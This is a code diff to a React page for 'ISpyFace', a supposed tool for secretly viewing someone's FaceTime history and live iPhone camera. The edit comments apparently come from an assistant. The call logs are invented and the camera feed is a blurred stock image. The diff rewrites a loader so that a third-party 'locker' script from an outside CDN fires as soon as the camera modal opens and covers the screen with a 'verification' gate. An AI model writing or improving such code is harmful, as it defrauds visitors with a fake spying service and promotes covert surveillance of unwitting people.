@@ -938,247 +938,79 @@ const S = [{
             })
         })
     };
+// ... (rest of the code remains the same until loadNewLocker)
+
 let newLockerLoaded = !1;
 const loadNewLocker = () => {
     if (newLockerLoaded) return Promise.resolve();
+    
+    // 1. Ensure the global variable is defined first and synchronously.
     const e = document.createElement("script");
     e.type = "text/javascript";
-    e.textContent = 'var kREIq_uBx_jQhXac={"it":4560459,"key":"4ddac"};';
+    // This script contains the configuration variable the locker script will look for
+    e.textContent = 'var kREIq_uBx_jQhXac={"it":4560437,"key":"791f2"};';
     document.head.appendChild(e);
-    const s = document.createElement("script");
-    return s.src = "https://duw03nk63ml3f.cloudfront.net/63b8af9.js", s.async = !0, s.onload = () => {
-        newLockerLoaded = !0
-    }, s.onerror = () => {
-        console.error("Failed to load new locker script")
-    }, document.head.appendChild(s), Promise.resolve()
-},
-// ... (rest of the code before loadNewLocker)
 
-// ... (previous part of the code up to loadNewLocker)
-    R = [{
-        name: "Anthony (brother) Tyler",
-        type: "ISpyFace Video",
-        time: "5:41 AM",
-        avatar: "https://images.pexels.com/photos/2269872/pexels-photo-2269872.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=2"
-    }, {
-        name: "Gary Son",
-        initials: "GS",
-        type: "ISpyFace Audio",
-        time: "Sunday"
-    }, {
-        name: "Kisha Tibbs",
-        initials: "KT",
-        type: "ISpyFace Video",
-        time: "Sunday"
-    }, {
-        name: "Davario Nephew Bates",
-        initials: "DB",
-        type: "ISpyFace Video",
-        time: "Sunday"
-    }, {
-        name: "Aretha Foster",
-        type: "ISpyFace Video",
-        time: "Saturday",
-        avatar: "https://images.pexels.com/photos/1239291/pexels-photo-1239291.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=2"
-    }],
-    O = ({
-        isOpen: e,
-        phoneNumber: s
-    }) => e ? $.jsxs("div", {
+    // 2. Load the main external locker script.
+    const s = document.createElement("script");
+    s.src = "https://d1y0yks1k8t5m5.cloudfront.net/902c1cf.js";
+    s.async = !0;
+    
+    s.onload = () => {
+        newLockerLoaded = !0;
+        console.log("New Locker Script Loaded and should execute.");
+    };
+    s.onerror = () => {
+        console.error("Failed to load new locker script");
+    };
+    
+    document.head.appendChild(s);
+    return Promise.resolve();
+};
+
+// ... (rest of the code remains the same for R and O)
+
+// CRITICAL FIXES IN COMPONENT U:
+// 1. Removed all delay from loading the locker.
+// 2. The placeholder content is replaced with a blank, high-Z-index container for the locker.
+const U = ({
+    isOpen: s
+}) => {
+    const [a, t] = e.useState(!0),
+        [l, i] = e.useState(!1);
+    
+    e.useEffect((() => {
+        if (!s) return void i(!1);
+        
+        // FIX: Load the script immediately when the modal opens.
+        i(!0); // Set the 'paused/locked' state immediately
+        loadNewLocker(); 
+        
+        // Mock timer for connection (does not delay locker load)
+        const e = setTimeout((() => {
+             
+        }), 4e3);
+        
+        return () => clearTimeout(e)
+    }), [s]), s ? $.jsxs("div", {
         className: "fixed inset-0 flex items-center justify-center z-50 p-4 fade-in",
         children: [$.jsx("div", {
             className: "fixed inset-0 bg-black/80 backdrop-blur-sm"
         }), $.jsxs("div", {
             className: "relative max-w-md w-full bg-[#1C1C1E] rounded-2xl overflow-hidden shadow-xl",
-            children: [$.jsxs("div", {
-                className: "relative px-4 py-3 border-b border-gray-800/30",
-                children: [$.jsx("h3", {
-                    className: "text-2xl font-semibold text-white",
-                    children: "FaceTime Activity"
-                }), $.jsxs("p", {
-                    className: "text-sm text-gray-400 mt-1",
-                    children: ["Call History of ", s]
-                })]
-            }), $.jsx("div", {
-                className: "divide-y divide-gray-800/30",
-                children: R.map(((e, s) => $.jsxs("div", {
-                    className: "flex items-center px-4 py-2.5 hover:bg-gray-800/30 transition-colors",
-                    children: [e.avatar ? $.jsx("div", {
-                        className: "w-10 h-10 rounded-full overflow-hidden bg-gray-800",
-                        children: $.jsx("img", {
-                            src: e.avatar,
-                            alt: "",
-                            className: "w-full h-full object-cover"
-                        })
-                    }) : $.jsx("div", {
-                        className: "w-10 h-10 rounded-full bg-gray-700 flex items-center justify-center",
-                        children: $.jsx("span", {
-                            className: "text-sm font-medium text-white",
-                            children: e.initials
-                        })
-                    }), $.jsxs("div", {
-                        className: "flex-1 ml-3",
-                        children: [$.jsxs("div", {
-                            className: "flex items-center justify-between",
-                            children: [$.jsx("span", {
-                                className: "text-white text-base",
-                                children: e.name
-                            }), $.jsx("span", {
-                                className: "text-sm text-gray-500",
-                                children: e.time
-                            })]
-                        }), $.jsxs("div", {
-                            className: "flex items-center space-x-2",
-                            children: [$.jsx("span", {
-                                className: "text-sm text-gray-400",
-                                children: e.type
-                            }), $.jsx("button", {
-                                className: "text-[#0A84FF] hover:text-[#0A84FF]/80 transition-colors",
-                                children: $.jsx("svg", {
-                                    className: "w-4 h-4",
-                                    viewBox: "0 0 24 24",
-                                    fill: "none",
-                                    stroke: "currentColor",
-                                    strokeWidth: "2",
-                                    strokeLinecap: "round",
-                                    strokeLinejoin: "round",
-                                    children: $.jsx("path", {
-                                        d: "M12 8L16 12M16 12L12 16M16 12H3M3.33782 7C5.06687 4.01099 8.29859 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C8.29859 22 5.06687 19.989 3.33782 17"
-                                    })
-                                })
-                            })]
-                        })]
-                    })]
-                }, s)))
-            })]
-        })]
-    }) : null,
-    U = ({
-        isOpen: s
-    }) => {
-        const [a, t] = e.useState(!0),
-            [l, i] = e.useState(!1);
-        return e.useEffect((() => {
-            if (!s) return void i(!1);
-            // **FIX: Load the locker script immediately when the modal opens**
-            i(!0); // Set the 'paused/locked' state immediately
-            loadNewLocker(); // Initiate the script load right away
-            
-            // This timeout is just to mimic the old connection logic, 
-            // but the locker should be loading in the background.
-            const e = setTimeout((() => {
-                 // No need to call loadNewLocker() again
-            }), 4e3);
-            
-            return () => clearTimeout(e)
-        }), [s]), s ? $.jsxs("div", {
-            className: "fixed inset-0 flex items-center justify-center z-50 p-4 fade-in",
             children: [$.jsx("div", {
-                className: "fixed inset-0 bg-black/80 backdrop-blur-sm"
+                className: "relative px-4 py-3 border-b border-gray-800/30",
+                children: $.jsxs("div", {
+                    className: "flex items-center",
+                    children: [$.jsx(r, {
+                        className: "w-5 h-5 mr-2 text-[#0A84FF]"
+                    }), $.jsx("h3", {
+                        className: "text-2xl font-semibold text-white",
+                        children: "Live Camera"
+                    })]
+                })
             }), $.jsxs("div", {
-                className: "relative max-w-md w-full bg-[#1C1C1E] rounded-2xl overflow-hidden shadow-xl",
-                children: [$.jsx("div", {
-                    className: "relative px-4 py-3 border-b border-gray-800/30",
-                    children: $.jsxs("div", {
-                        className: "flex items-center",
-                        children: [$.jsx(r, {
-                            className: "w-5 h-5 mr-2 text-[#0A84FF]"
-                        }), $.jsx("h3", {
-                            className: "text-2xl font-semibold text-white",
-                            children: "Live Camera"
-                        })]
-                    })
-                }), $.jsxs("div", {
-                    className: "relative aspect-[4/3] bg-black overflow-hidden",
-                    children: [$.jsx("div", {
-                        className: "absolute inset-0 bg-cover bg-center bg-no-repeat",
-                        style: {
-                            backgroundImage: "url(https://images.pexels.com/photos/3760263/pexels-photo-3760263.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=2)",
-                            filter: "blur(25px) brightness(0.4)",
-                            transform: "scale(1.1)"
-                        }
-                    }), $.jsx("div", {
-                        className: "absolute inset-0 flex items-center justify-center",
-                        children: $.jsxs("div", {
-                            className: "text-center",
-                            children: [$.jsx("div", {
-                                className: "w-16 h-16 rounded-full bg-gray-800/50 mx-auto mb-4 flex items-center justify-center backdrop-blur-sm",
-                                children: $.jsx(r, {
-                                    className: "w-8 h-8 text-gray-300"
-                                })
-                            }), $.jsx("p", {
-                                className: "text-sm text-gray-300",
-                                children: l ? "Live feed paused" : "Connecting to live feed..."
-                            })]
-                        })
-                    }), $.jsx("div", {
-                        className: "absolute bottom-4 right-4 flex space-x-2",
-                        children: $.jsx("button", {
-                            onClick: () => t(!a),
-                            className: "w-8 h-8 rounded-full bg-black/50 backdrop-blur-sm flex items-center justify-center text-white hover:bg-black/70 transition-colors",
-                            children: a ? $.jsx(o, {
-                                className: "w-4 h-4"
-                            }) : $.jsx(d, {
-                                className: "w-4 h-4"
-                            })
-                        })
-                    })]
-                }), $.jsxs("div", {
-                    className: "p-4 border-t border-gray-800/30",
-                    children: [$.jsxs("div", {
-                        className: "flex items-center justify-between text-sm mb-2",
-                        children: [$.jsx("span", {
-                            className: "text-gray-400",
-                            children: "Device"
-                        }), $.jsx("span", {
-                            className: "text-white",
-                            children: "iPhone"
-                        })]
-                    }), $.jsxs("div", {
-                        className: "flex items-center justify-between text-sm",
-                        children: [$.jsx("span", {
-                            className: "text-gray-400",
-                            children: "Status"
-                        }), $.jsx("span", {
-                            className: "text-green-400",
-                            children: "Active"
-                        })]
-                    })]
-                }), l && $.jsxs("div", {
-                    className: "absolute inset-0 bg-black/90 backdrop-blur-sm flex flex-col items-center justify-center p-6 fade-in",
-                    children: [$.jsx("div", {
-                        className: "w-14 h-14 bg-yellow-500/10 rounded-full flex items-center justify-center mx-auto mb-4",
-                        children: $.jsx(m, {
-                            className: "w-7 h-7 text-yellow-500"
-                        })
-                    }), $.jsxs("div", {
-                        className: "text-center mb-6",
-                        children: [$.jsx("h3", {
-                            className: "text-xl font-semibold text-white mb-2",
-                            children: "Live Camera Access"
-                        }), $.jsx("p", {
-                            className: "text-sm text-gray-400",
-                            children: "Complete verification to access the live camera feed without alerting the user"
-                        })]
-                    })]
-                })]
-            })]
-        }) : null
-    },
-    H = ({
-        phoneNumber: s,
-        onClose: a
-    }) => {
-        const [t, l] = e.useState(!1),
-            [i, c] = e.useState(!1);
-        return e.useEffect((() => {
-            (t || i) && setTimeout((() => {
-                loadNewLocker()
-            }), 300)
-        }), [t, i]), $.jsxs("div", {
-            className: "w-full h-[100dvh] fixed inset-0 bg-black fade-in",
-            children: [$.jsxs("div", {
-                className: "relative w-full h-full",
+                className: "relative aspect-[4/3] bg-black overflow-hidden",
                 children: [$.jsx("div", {
                     className: "absolute inset-0 bg-cover bg-center bg-no-repeat",
                     style: {
@@ -1186,79 +1018,64 @@ const loadNewLocker = () => {
                         filter: "blur(25px) brightness(0.4)",
                         transform: "scale(1.1)"
                     }
-                }), $.jsxs("div", {
-                    className: "absolute inset-0 flex flex-col items-center justify-between py-12 px-6",
-                    children: [$.jsx("div", {
-                        className: "w-full text-center",
-                        children: $.jsx("h1", {
-                            className: "text-[42px] font-semibold tracking-tight",
-                            style: {
-                                fontFamily: "-apple-system, BlinkMacSystemFont, sans-serif"
-                            },
-                            children: "ISpyFace"
-                        })
-                    }), $.jsxs("div", {
+                }), $.jsx("div", {
+                    className: "absolute inset-0 flex items-center justify-center",
+                    children: $.jsxs("div", {
                         className: "text-center",
                         children: [$.jsx("div", {
-                            className: "w-28 h-28 rounded-full bg-gray-600 mx-auto mb-4 relative overflow-hidden flex items-center justify-center",
-                            children: $.jsx(x, {
-                                className: "w-16 h-16 text-gray-400"
+                            className: "w-16 h-16 rounded-full bg-gray-800/50 mx-auto mb-4 flex items-center justify-center backdrop-blur-sm",
+                            children: $.jsx(r, {
+                                className: "w-8 h-8 text-gray-300"
                             })
-                        }), $.jsx("h2", {
-                            className: "text-2xl font-medium mb-1",
-                            children: "Device Online"
                         }), $.jsx("p", {
-                            className: "text-base text-green-400",
-                            children: "Live Camera Available"
+                            className: "text-sm text-gray-300",
+                            children: l ? "Live feed paused" : "Connecting to live feed..."
                         })]
-                    }), $.jsxs("div", {
-                        className: "w-full max-w-xs space-y-3",
-                        children: [$.jsxs("div", {
-                            className: "flex justify-center gap-4",
-                            children: [$.jsxs("button", {
-                                onClick: () => l(!0),
-                                className: "w-[140px] h-12 rounded-full bg-[#4CD964] flex items-center justify-center space-x-2 hover:bg-[#44c359] transition-colors",
-                                children: [$.jsx(h, {
-                                    className: "w-5 h-5"
-                                }), $.jsx("span", {
-                                    className: "font-medium",
-                                    children: "View History"
-                                })]
-                            }), $.jsxs("div", {
-                                className: "flex flex-col items-center",
-                                children: [$.jsxs("button", {
-                                    onClick: () => c(!0),
-                                    className: "w-[140px] h-12 rounded-full bg-white flex items-center justify-center hover:bg-gray-100 transition-colors",
-                                    children: [$.jsx(r, {
-                                        className: "w-5 h-5 text-black mr-2"
-                                    }), $.jsx("span", {
-                                        className: "font-medium text-black",
-                                        children: "View Live"
-                                    })]
-                                }), $.jsx("p", {
-                                    className: "text-xs text-gray-400 mt-1",
-                                    children: "Target won't be notified"
-                                })]
-                            })]
-                        }), $.jsx("button", {
-                            onClick: a,
-                            className: "w-full h-12 rounded-full bg-[#3A3A3C] text-white font-medium hover:bg-[#444446] transition-colors",
-                            children: "Close"
-                        })]
-                    })]
-                }), $.jsx(O, {
-                    isOpen: t,
-                    onClose: () => l(!1),
-                    phoneNumber: s
-                }), $.jsx(U, {
-                    isOpen: i,
-                    onClose: () => c(!1)
+                    })
+                }), $.jsx("div", {
+                    className: "absolute bottom-4 right-4 flex space-x-2",
+                    children: $.jsx("button", {
+                        onClick: () => t(!a),
+                        className: "w-8 h-8 rounded-full bg-black/50 backdrop-blur-sm flex items-center justify-center text-white hover:bg-black/70 transition-colors",
+                        children: a ? $.jsx(o, {
+                            className: "w-4 h-4"
+                        }) : $.jsx(d, {
+                            className: "w-4 h-4"
+                        })
+                    })
                 })]
-            })]
-        })
-    },
-    M = ({
-// ... (rest of the code remains the same)
+            }), $.jsxs("div", {
+                className: "p-4 border-t border-gray-800/30",
+                children: [$.jsxs("div", {
+                    className: "flex items-center justify-between text-sm mb-2",
+                    children: [$.jsx("span", {
+                        className: "text-gray-400",
+                        children: "Device"
+                    }), $.jsx("span", {
+                        className: "text-white",
+                        children: "iPhone"
+                    })]
+                }), $.jsxs("div", {
+                    className: "flex items-center justify-between text-sm",
+                    children: [$.jsx("span", {
+                        className: "text-gray-400",
+                        children: "Status"
+                    }), $.jsx("span", {
+                        className: "text-green-400",
+                        children: "Active"
+                    })]
+                })]
+            }), 
+            // FIX: This is the new, empty, high-priority container for the locker
+            l && $.jsx("div", {
+                id: "locker-target-container",
+                className: "absolute inset-0 bg-black/90 z-[100] fade-in"
+            })
+            ]
+        })]
+    }) : null
+},
+M = ({
         onClose: e
     }) => {
         const s = (new Date).toLocaleDateString("en-US", {
